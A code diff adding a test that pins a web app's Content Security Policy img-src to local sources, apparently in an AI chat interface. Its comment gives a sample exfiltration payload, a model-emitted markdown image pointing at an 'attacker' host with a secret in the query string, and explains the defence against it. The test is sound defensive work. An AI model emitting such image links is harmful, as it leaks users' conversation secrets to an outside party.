@@ -72,6 +72,19 @@ describe('script execution', () => {
     expect(scriptSrc).toContain("'self'");
   });
 
+  it.each([
+    ['dev', {}],
+    ['msal', MSAL],
+  ])('pins img-src to local sources only in %s mode', async (_mode, env) => {
+    // The last line of defence against conversation exfiltration via a model-emitted
+    // `![](https://attacker/?q=<secret>)`. `Markdown.tsx` refuses to render an external `<img>`
+    // at all, but this directive is what stops one that slips past it (or any other component)
+    // from ever reaching the network. No remote host is permitted; `data:` and `blob:` are the
+    // page's own inlined/minted images. Pinned in both auth modes because neither branch touches
+    // it — a widening here would be silent otherwise.
+    expect(await csp(env).then((d) => d.get('img-src'))).toEqual(["'self'", 'data:', 'blob:']);
+  });
+
   it('states worker-src, which does not fall back to script-src', async () => {
     // Browsers that implement `worker-src` do NOT fall back to `script-src` for it, so an omitted
     // directive is not "inherit" — Ketcher's Indigo worker simply fails on the first operation.
